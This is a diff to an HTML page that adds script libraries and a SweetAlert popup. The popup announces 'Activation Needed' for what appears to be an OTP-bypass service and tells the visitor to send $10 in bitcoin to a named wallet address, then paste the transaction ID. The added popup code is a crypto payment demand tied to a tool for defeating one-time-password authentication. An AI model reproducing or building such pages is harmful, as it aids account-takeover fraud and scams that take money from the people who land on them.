@@ -18,6 +18,9 @@
     <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:300i,400,700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css">
+	  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+        <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>   
+        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script> 
     <style type="text/css">
       body{
       font-family: "Nunito Sans";
@@ -136,5 +139,16 @@ if(a>=txt.length) {
         </div>
       </div>
     </div>
+	      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/js/bootstrap.bundle.min.js"></script>
+	 <script>
+Swal.fire({
+  title: 'Activation Needed ⚠️',
+  iconHtml: '<img src="https://s3.amazonaws.com/cdn.freshdesk.com/data/helpdesk/attachments/production/67013648486/logo/bEg0jlYeXFGp4fwYQfmfR3WPrjfn7wD27g.png" height="100px" width="100px"/>',
+  html:"This activation is entitled to only one OTP bypassing. <br>👉<b>Help :</b> Kindly transact $10 worth btc to the address below. <br><br><b>Address :</b> <b>bc1q0a2up8lsp8uuksqtg0swj24eur8tlc04k99mk0  👉</b> <b>Copy your transaction ID and paste it when asked.<br>",
+  customClass: {
+    icon: 'no-border'
+  }
+});</script>
   </body>
 </html>
